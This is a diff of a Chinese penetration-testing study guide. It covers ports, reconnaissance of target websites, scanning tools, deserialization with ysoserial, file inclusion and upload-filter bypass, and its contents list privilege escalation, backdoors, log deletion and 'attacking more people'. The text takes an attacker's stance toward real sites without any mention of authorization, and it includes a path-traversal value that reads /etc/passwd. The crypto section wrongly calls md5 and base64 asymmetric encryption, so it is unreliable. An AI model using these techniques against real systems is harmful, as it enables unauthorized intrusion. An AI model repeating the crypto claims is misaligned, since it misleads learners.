@@ -1,3 +1,4 @@
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515191227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 @[toc]
@@ -11,7 +12,6 @@
     - [日志分析](#日志分析)
     - [端口](#端口)
       - [常见端口](#常见端口)
-    - [蜜罐](#蜜罐)
   - [网络基础](#网络基础)
     - [术语](#术语-1)
       - [OSI七层协议](#osi七层协议)
@@ -42,7 +42,6 @@
           - [access](#access)
           - [mysql](#mysql)
       - [非关系型](#非关系型)
-        - [非关系型数据库代表](#非关系型数据库代表)
     - [开源渗透测试标准](#开源渗透测试标准)
     - [Linux](#linux)
         - [更新安装列表](#更新安装列表)
@@ -50,6 +49,7 @@
       - [常见有用命令](#常见有用命令)
     - [windows](#windows)
       - [windows 常见命令](#windows-常见命令)
+      - [powshell](#powshell)
 - [信息收集](#信息收集)
   - [信息搜集开源项目](#信息搜集开源项目)
   - [web组成框架信息收集](#web组成框架信息收集)
@@ -75,7 +75,7 @@
         - [图像](#图像)
         - [阻塞遍历序列](#阻塞遍历序列)
 - [工具](#工具-1)
-    - [配置上网](#配置上网)
+    - [虚拟机配置上网](#虚拟机配置上网)
   - [学会上网](#学会上网)
     - [google hack](#google-hack)
     - [暗网](#暗网)
@@ -256,25 +256,25 @@
     - [攻击过程](#攻击过程)
       - [DDOS 攻击手段](#ddos-攻击手段)
 - [经验积累](#经验积累)
-  - [CMS漏洞](#cms漏洞)
+  - [CMS特性](#cms特性)
     - [敏感信息搜集](#敏感信息搜集)
     - [工具](#工具-3)
       - [利用](#利用)
       - [弱口令](#弱口令)
     - [thinkphp5](#thinkphp5)
       - [特性](#特性)
+      - [历史漏洞](#历史漏洞)
     - [dedecms](#dedecms)
       - [基本信息](#基本信息)
       - [敏感信息](#敏感信息)
   - [语言特性](#语言特性)
     - [PHP](#php-1)
       - [变量覆盖漏洞](#变量覆盖漏洞)
-    - [JAVA](#java-1)
+    - [JAVAWEB](#javaweb)
       - [与SQL注入有关的预编译](#与sql注入有关的预编译)
       - [JSON WEB TOKEN](#json-web-token)
         - [破解](#破解-1)
   - [WAF绕过](#waf绕过)
-    - [基本知识](#基本知识-1)
       - [市面上WAF](#市面上waf)
         - [阿里云盾](#阿里云盾)
         - [宝塔](#宝塔)
@@ -295,7 +295,7 @@
     - [xss 绕过](#xss-绕过)
     - [权限控制拦截](#权限控制拦截)
     - [其他绕过总结](#其他绕过总结)
-  - [一句话木马](#一句话木马)
+  - [木马](#木马)
   - [密码](#密码)
 - [系统漏洞](#系统漏洞)
   - [工具](#工具-4)
@@ -318,7 +318,6 @@
 - [经验](#经验-1)
     - [攻破类似网站](#攻破类似网站)
       - [如何攻击更多人](#如何攻击更多人)
-  - [密码](#密码-1)
     - [windows密码获取和破解](#windows密码获取和破解)
     - [Linux密码获取和破解](#linux密码获取和破解)
   - [后渗透](#后渗透)
@@ -340,14 +339,49 @@
         - [加被害者](#加被害者)
       - [社工库](#社工库)
   - [绕过CDN](#绕过cdn)
-  - [WAF](#waf)
-  - [待补充：横向渗透](#待补充横向渗透)
-  - [待补充：提权](#待补充提权)
+  - [获取数据库账号密码](#获取数据库账号密码)
+    - [mysql](#mysql-1)
+      - [获取基本信息](#获取基本信息)
+      - [获取root账号密码](#获取root账号密码)
+      - [Oracle](#oracle)
+    - [MssQL](#mssql)
+    - [Redis](#redis)
+      - [PostgreSQL](#postgresql)
+  - [提权](#提权)
+    - [提权准备](#提权准备)
+    - [window提权](#window提权)
+      - [提权准备](#提权准备-1)
+      - [win2003](#win2003)
+      - [win7](#win7)
+      - [win2008](#win2008)
+      - [Windows2008&7令牌窃取提升-本地](#windows20087令牌窃取提升-本地)
+      - [不安全的服务权限配合MSF-本地权限](#不安全的服务权限配合msf-本地权限)
+        - [攻击过程](#攻击过程-1)
+      - [win2012不带引号服务路径配合MSF-Web,本地权限](#win2012不带引号服务路径配合msf-web本地权限)
+        - [攻击过程](#攻击过程-2)
+      - [win2012DLL劫持提权应用配合MSF-Web权限](#win2012dll劫持提权应用配合msf-web权限)
+      - [Win2012烂土豆提权](#win2012烂土豆提权)
+        - [提权原理](#提权原理)
+        - [提权过程](#提权过程)
+    - [LINUX提权](#linux提权)
+      - [提权准备](#提权准备-2)
+    - [数据库提权](#数据库提权)
+      - [Mysql](#mysql-2)
+        - [UDF](#udf)
+        - [MOF](#mof)
+        - [启动项知识点:(基于配合操作系统自启动)](#启动项知识点基于配合操作系统自启动)
+        - [反弹知识点:(基于利用反弹特性命令执0行)](#反弹知识点基于利用反弹特性命令执0行)
+      - [Oracle提权演示](#oracle提权演示)
+      - [MssQL](#mssql-1)
+        - [使用xp_emdshell进行提权](#使用xp_emdshell进行提权)
+        - [SQL sever 沙盒提权](#sql-sever-沙盒提权)
+      - [Redis](#redis-1)
+        - [Redis数据库权限提升](#redis数据库权限提升)
+      - [PostgreSQL](#postgresql-1)
     - [后门](#后门)
       - [后门中的后门](#后门中的后门)
       - [后门软件](#后门软件)
         - [远程控制](#远程控制)
-    - [windows](#windows-2)
   - [批量刷漏洞](#批量刷漏洞)
   - [漏洞易发现模块](#漏洞易发现模块)
     - [发送邮件/电话号码短信](#发送邮件电话号码短信)
@@ -356,12 +390,20 @@
     - [linux 入侵检查](#linux-入侵检查)
     - [如何发现隐藏的 Webshell 后门](#如何发现隐藏的-webshell-后门)
 - [代码审计](#代码审计)
-  - [工具](#工具-5)
-  - [常规代码审计](#常规代码审计)
+  - [phpweb](#phpweb)
+    - [一键审计](#一键审计)
+    - [数据库监控](#数据库监控)
+    - [常规代码审计](#常规代码审计)
+  - [JAVAWEB](#javaweb-1)
+    - [基础开发知识](#基础开发知识)
+    - [审计](#审计)
+      - [手动](#手动-1)
+      - [工具](#工具-5)
+  - [asp](#asp)
 - [隐藏技术](#隐藏技术)
   - [实用工具](#实用工具)
     - [匿名工具](#匿名工具)
-    - [防止掉入蜜罐](#防止掉入蜜罐)
+    - [蜜罐](#蜜罐)
     - [日志删除](#日志删除)
     - [获得 Shell后](#获得-shell后)
       - [进程迁移](#进程迁移)
@@ -382,13 +424,14 @@
   - [导航](#导航)
   - [大佬博客](#大佬博客)
   - [赏金平台/SRC](#赏金平台src)
-  - [图书推荐](#图书推荐)
+  - [待整理：图书推荐](#待整理图书推荐)
   - [博客](#博客)
   - [如何修成](#如何修成)
       - [成为什么样的人](#成为什么样的人)
       - [让自己小有名气](#让自己小有名气)
         - [写书](#写书)
     - [更多阅读](#更多阅读)
+
 # 写在前面
 
 **作者：北丐**
@@ -418,23 +461,31 @@
 
 
 # 常见知识点
-只介绍常见和必备基础不涉及到深度
-## 密码学和编码
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210603154257943.png)
 
-密码学的对称密码与非对称密码有哪些
- -- 对称：DES、3DES、AES等
- -- 非对称：md5、base64等
+只介绍常见和必备基础不涉及到深度
+
+## 密码学和编码
+
+**加密和编码是什么**
+加密和编码在很多程序员口中是没有细分概念的，对于做安全的人来说，确实区分不要紧，只需要认识特征与知道这种方式是否可逆。编码是将一系列字符放入一种特殊格式以进行传输或存储的过程。 加密是将数据转换成密码的过程。
+
+**常用加密方式**
+windows系统密码是ntlm
+对于网站常用base64对url中id进行加密
+对于数据库密码常用md5加密
+
+**对称与与非对称加密**
+对称加密是指加解密使用的是同样的密钥，常见对称加密有DES、3DES、AES等
+非对称加密是指加解密使用的密钥不同。常见非对称加密有md5等
 
 
 #### 分辨是什么类型的
+
 互联网只接受 ASCII 格式的 URL，URL 编码需要对 URL 字符集的某些部分进行编码。此过程将一个字符转换为一个字符三元组，其前缀为“%”，后跟两个十六进制格式的数字。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628204319808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628210715235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 md5:任意长度的数据，算出的MD5值长度都是固定的，一般是32位也有16位。由数字大小写混成。密文中字母大小写不会影响破解结果
-
-
 
 如何分辨base64【主要应用在web中用于对源码的加密或者用户名或者密码的加密】
 长度一定会被4整除
@@ -514,7 +565,7 @@ ftp的端口号20、21的区别前者是数据端口，后者是控制端口
 
 
 **SSH：22**
-SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。
+SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。
 
 
 **23 Telnet**
@@ -534,7 +585,7 @@ smtp：邮件协议，在linux中默认开启这个服务，可以向对方发�
 
 
 **135**
-135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’病毒就是利用这个漏洞进行传播的。 
+135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。
 
 **139/445**
 445 SMB     ms17-010永恒之蓝
@@ -542,38 +593,24 @@ smtp：邮件协议，在linux中默认开启这个服务，可以向对方发�
 
 
 
-**1433 MSSQL**
-1433是SQLServer默认的端口，SQL Server服务使用两个端口：tcp-1433、UDP-1434.其中1433用于供SQLServer对外提供服务，1434用于向请求者返回SQLServer使用了哪些TCP/IP端口。1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。
-
-**1521 Oracle **
-
-1521是大型数据库Oracle的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是Access，MSSQL以及MYSQL这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：
-
 **2409**
-NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。
+NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。
 
-**3306**
-MYSQL数据库默认的监听端口
 
 **3389端口渗透剖析**
 3389是windows远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。
 
 
 **4899端口**
-是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。radmini目前支持TCP/IP协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：
+是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。
 
-**5432端口渗透剖析**
-
-PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。
 
 **5631端口渗透剖析**
-5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意下载保存连接密码的*.cif文件，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个webshell。通常这些操作在黑客界被称为pcanywhere提权技术。
+5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。
 
 **5900端口渗透剖析**
-5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&T的欧洲研究实验室开发的。VNC是在基于unix和linux操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和windows和MAC中的任何一款控制软件媲美。
+5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&T的欧洲研究实验室开发的。
 
-**6379端口渗透剖析**
-Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。这种数据库通常用来存储序列化后的字符串。
 
 
 **7001/7002端口渗透剖析**
@@ -584,26 +621,40 @@ Redis是一个开源的使用c语言写的，支持网络、可基于内存亦�
 **8080端口渗透剖析**
 8080端口通常是apache_Tomcat服务器默认监听端口，apache是世界使用排名第一的web服务器。国内很多大型系统都是使用apache服务器，对于这种大型服务器的渗透，主要有以下方法：
 
-**27017端口渗透剖析**
+**数据库端口**
+mysql：3306
 
-MongoDB，NoSQL数据库；攻击方法与其他数据库类似
+oracle：1521
+
+postgrsql：5432
+
+derby：1527
+
+SQL Server：1433
+
+DB2：50000
+
+sybase：5000
+
+mongoDB：27017
+
+Redis:6379
 
 
-
-### 蜜罐
-
-蜜罐成了今年的重头反制武器，攻击方小心翼翼，清空浏览器缓存、不敢用自己电脑。防守方也因为蜜罐的部署解决了往年被疯狂扫描的想象，由被动变为主动。蜜罐溯源反制终将成为一个常态化趋势~~~
 
 
 
 ## 网络基础
+
 ### 术语
+
  **同源策略**
 
 同源：协议、域名、端口都一样就是同源
  ~ http、https、 
  ~ a.com、b.com
  ~ url:80、url:90
+
 #### OSI七层协议
 
 **物理层**
@@ -748,7 +799,9 @@ DMARC（Domain-based Message Authentication, Reporting & Conformance）是txt记
 https://en.wikipedia.org/wiki/DMARC#Alignment
 
 ### HTTP/HTTPS基础知识
+
 #### 源码与展示
+
 index.php（做个例子实际下index没太大意义）和网页展示的php通常不会是一样文件(网页只有js或html源码和F12结果是一样的，这可以用来判断一些网站是做前端验证还是服务器验证)，前者源码包含的文件更多，后者是解析后的文件。
 
 ##### cookie含义
@@ -763,27 +816,30 @@ get传参与post传参的区别
  -- get在url可见、post相对隐蔽（但是抓包都一样）
 
 #### 状态码
+
 30X（移动） 
 403（禁止） 权限不够，服务器拒绝请求。
 404（未找到）
 
-
-
 HTTPS多了SSL层，但一般而言这对于黑客而言于事无补。因为我们仍旧可以通过替换、伪造SSL证书或SSL剥离达到中间人攻击目的。
 
 小网站通常买不起SSL证书，所以这些网站会签订私人的SSL证书，私人的SSL证书会提示网站是私密链接
-![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050621322069.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ### 代理
 
+代理分为正向和反向。
+正向代理：代理位于客户端和服务器之间，为了从服务器取得内容，客户端向代理发送一个请求并指定目标(服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。
+比如你在国内利用代理访问谷歌，在家利用代理访问公司内网等，这些就是正向代理。服务器每次记录时是在记录你的代理，这就达到了简单匿名效果。
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625105740662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。
 
-
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719181749643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
 
 
 ### 编程语言
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715213229225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
@@ -799,10 +855,14 @@ python lambda
 
 
 #### JAVASCRIPT
+
 js里面放前端函数
 
 
 #### JAVA
+
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718155518374.png)
+
 安卓一般用java开发，安卓apk通过反编译就可以得到java文件，所以明白java特性对安卓漏洞也有好处。
 
 
@@ -815,6 +875,7 @@ js里面放前端函数
 
 
 #### MVC
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717183445298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
@@ -891,11 +952,10 @@ mysql的网站注入，5.0以上和5.0以下有什么区别？
 
 #### 非关系型
 
-非关系型数据库又被称为 NoSQL（Not Only SQL )，意为不仅仅是
-SQL。通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。
+非关系型数据库又被称为 NoSQL（Not Only SQL )，意为不仅仅是SQL。常见的非关系型数据库有 Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase 等。通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。
 一. 优点
 非关系型数据库存储数据的格式可以是 key-value
-形式、文档形式、图片形式等。使用灵活，应用场景广泛，而关系型数据库则只支持基础类型。
+形式、文档形式、图片形式等。使用灵活，而关系型数据库则只支持基础类型。
 速度快，效率高。NoSQL 可以使用硬盘或者随机存储器作为载体，而关系型数据库只能使用硬盘。
 海量数据的维护和处理非常轻松。
 非关系型数据库具有扩展简单、高并发、高稳定性、成本低廉的优势。
@@ -906,9 +966,8 @@ SQL。通常指数据以对象的形式存储在数据库中，而对象之间�
 功能没有关系型数据库完善。
 
 
-##### 非关系型数据库代表
 
-常见的非关系型数据库有 Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase 等。
+
 
 
 ### 开源渗透测试标准
@@ -1021,6 +1080,9 @@ bunzip2 NB.*
 
 #### windows 常见命令
 
+熟悉命令，这部分知识通常用于拿到shell对对方查看或提权
+![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718222549927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 
 
 
@@ -1055,10 +1117,14 @@ Certutil.exe是作为证书服务的一部分安装的命令行程序。 我们�
 ```
 
 
-
+#### powshell
+现在一些提权项目不满足于仅限cmd的执行了，通常需要powershell，你可以在你打开cmd后输入powershell。如下图打开了powershell
+![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071823320195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 # 信息收集
+
 如果你是攻击中小型网站，你信息搜集第一步是获取网站全貌，在着重点于收集网站第三方或源码，这会加快你的渗透速度。
-最后才是做常规信息搜集
+最后无法搜集到才是做常规信息搜集。
+（搜集完之后对网站进行分类，优先测试最可能存在的漏洞点）
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520155239679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 
@@ -1099,9 +1165,10 @@ apache,iis,tomcat,nginx
 
 ## 源码层面收集
 
-你可以在淘宝、闲鱼上购买源代码比如搜索关键词资金盘系统
+寻找有无开源的github
+下载CMS
+寻找 网站有没有备份隐藏的源代码
 
-还可以去一些比如专门卖灰色源码的网站进行收集比如http://www.wayu.cn/muban/dedecms?v=free
 ### CMS识别
 
 常见的开源CMS有
@@ -1148,8 +1215,11 @@ Dedecms discuz phpcms wordpress zblog phpweb aspcms
 xray的rad爬虫 https://github.com/chaitin/rad
 
 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN
+
 ## 特殊信息
+
 #### 备案
+
 注册人
 查询域名注册邮箱
 通过备案号查询域名
@@ -1158,11 +1228,15 @@ xray的rad爬虫 https://github.com/chaitin/rad
 通过注册人查询到的域名在查询邮箱
 通过上一步邮箱去查询域名
 域名登记
+
 #### 特殊文件
+
 **网站使用说明书**
 
 通常包含一些敏感信息，比如登录敏感目录，管理员默认密码，密码长度等
+
 #### 公司
+
 **企业附属品**
 
 采购巩固、版权声明
@@ -1200,6 +1274,7 @@ xray的rad爬虫 https://github.com/chaitin/rad
 ICP备案查询网
 
 #### 网站附属产品
+
 **APP**
 
 * 七麦数据： https://www.qimai.cn/，可以查到企业下一些比较冷门的app。
@@ -1214,8 +1289,10 @@ https://www.baidu.com
 www 就是顶级域名，如果是https://blog.baidu.com就是他的子域名
 
 ##### 相似域名
+
 用阿里云
 万网搜索是否号被注册了
+
 ##### 方法一：爆破子域名
 
 >方法1：利用工具
@@ -1281,7 +1358,9 @@ url/login 的 login 换成reg、register、sign字段
 查看robots.txt文件，对于一些简单的马大哈网站这个配置文件将会包含信息
 www.xxx.com/admin 加上/login.aspx(php)
 www.xxx.com 加上/static;/backup
+
 ##### 工具
+
 **御剑后台扫描珍藏版**
 御剑后台扫描珍藏版:用于爆破目录，同时通过爆破出来的目录就可以知道网站是什么语言写的比如/admin/login.aspx就是用aspx。
 
@@ -1353,7 +1432,7 @@ filename=../../../etc/passwd
 工具这一部分除了参考我简介的基本规则，你最需要的是上手练习以及理解这些工具是做了什么事，尤其是在不知道为什么报错时。练习无话可说，别贪能上手就行。理解工具可以用进程抓包工具，比如WSExplorer或火绒剑看软件发了什么请求。
 另外这部分内容我会尽可能稀释，不然你阅读可能会感到乏味，部分工具的使用我会移入后续章节![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716002538181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-### 配置上网
+### 虚拟机配置上网
 
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515003648812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
@@ -1588,11 +1667,6 @@ FoFa搜索引擎偏向资产搜索。
 
 dnsdb搜索引擎是一款针对dns解析的查询平台。
 地址：https://www.dnsdb.io/
-
-
-
-
-
 
 ## 邮件
 
@@ -1955,6 +2029,7 @@ Metasploit scanning module
 主要测试防火墙拦截规则，对网络进行测试
 
 ### 抓包工具
+
 ### 进程装包
 
   http://www.downcc.com/soft/11196.html
@@ -1967,6 +2042,7 @@ Wireshark是绝对经典的，最著名的网络分析仪和密码破解工具�
 Wireshark官方下载链接： https://www.wireshark.org/download.htmlZ
 
 #### Burpsuite
+
 **详细待补充burpsuite安装、功能模块、网页代理设置**
 数据联动
 Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。
@@ -2028,6 +2104,7 @@ Intruder是一个高度可配置工具，可以对web自动化攻击，模糊测
 
 
 #### Awvs
+
 注意:登录类网站扫描要带cookies扫才能扫到
 awvs_13.0.2009 web漏洞扫描器 安装教程,附下载破解包下载链接
 
@@ -2143,6 +2220,7 @@ rdesktop 10.101.2.11
 
 
 # web安全
+
 你应该根据网站的类型去鉴定最可能存在的漏洞是什么，比如社交最可能存在XSS、文件操作最可能存在包含上传或下载漏洞。根据你的猜想首先去测试最可能的网站的漏洞
 
 
@@ -2158,6 +2236,7 @@ rdesktop 10.101.2.11
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507200853468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 ## 反序列化（对象注入）
+
 如果学了点代码内核的，这一节理解基础不在话下，不然的话得多补补程序的魔术方法执行顺序以及什么是序列化。
 
 序列化：将php中对象、类、数组、变量、匿名函数等，转化为字符串 方便保存到数据库或者文件中（将状态信息保存为字符串）
@@ -2171,20 +2250,25 @@ rdesktop 10.101.2.11
 ### PHP序列化与反序列化
 
 #### 无类
+
 **准备知识**
 PHP对象字符串后打印结果的意义，注意对int和string的输出是不一样的：
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713182708648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 **php序列化与反序列化相关函数**
+
 ```bash
 对象转换为字符串/字符串转换为对象
 serialize()/unserialize()
 ```
+
 unserialize（）在执行时如果传入的是非空，会调用苏醒函数__wakeup()
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713183229700.png)
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713200413947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 如果你想直接输出unserialize（）的值你应该用var_dump而不是echo
+
 #### 有类
+
 以下是php的一些常见魔法方法
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713192123547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 漏洞一般就是产生在魔法方法里，在魔法方法中执行危险函数。比如在析构函数里执行SQL语句查询
@@ -2194,9 +2278,13 @@ unserialize（）在执行时如果传入的是非空，会调用苏醒函数__w
 
 
 weblogic的反序列化
+
 ### JAVA序列化与反序列化
+
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713203116925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+
 #### 序列化函数介绍
+
 java没有魔术方法，与序列化相关的函数只有简单的几组
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714114559886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
@@ -2212,12 +2300,14 @@ java没有魔术方法，与序列化相关的函数只有简单的几组
 
 
 #### 工具
+
 https://github.com/frohoff/ysoserial
 ysoserial 工具会帮助你实现序列化，然后对方程序再调用反序列化去执行危险命令
 
 当你在目标网站发现一串数据是以rO0AB开头的，你可以先寻找目标站点是否有反序列化操作，即看这个序列化结果是否能被执行成正常代码或正常值得显示。如果是那么你就可以利用ysoserial去生成一段危险的序列化代码即payload。生成之后按照指定的编码格式，看是base64还是HEX，将这payload与前面目标网站抓取到的rO0AB序列化数据包替换。
 
 ## 重放攻击
+
 重复发送请求就是重放攻击
 
 
@@ -2252,6 +2342,7 @@ ysoserial 工具会帮助你实现序列化，然后对方程序再调用反序�
 如果上传文件为 tar / tar.gz 类型，可以尝试构压缩包内文件名为../../../../xxx 的tar包
 文件导出
 如果是CSV 或者 Excel可以注意一下CSV注入
+
 ### 文件包含
 
 将文件包含进去，调用指定文件的代码.这种漏洞也很好被确定，一般url包含形如file=1.txt的参数就可以疑似了。在进一步直接访问url/1.txt，如果返回的界面与带参数file=1.txt一样那么你就可以确认这是文件包含了 
@@ -2506,7 +2597,7 @@ wordpress，phpcms
 
 
 * 前端JS检测绕过，JS前端都可以看到防御函数的，可以用此方法。当然如果文件从前端过来后，后端仍旧对格式有上传后缀名判断，就行不通的
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512190248641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
+  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512190248641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
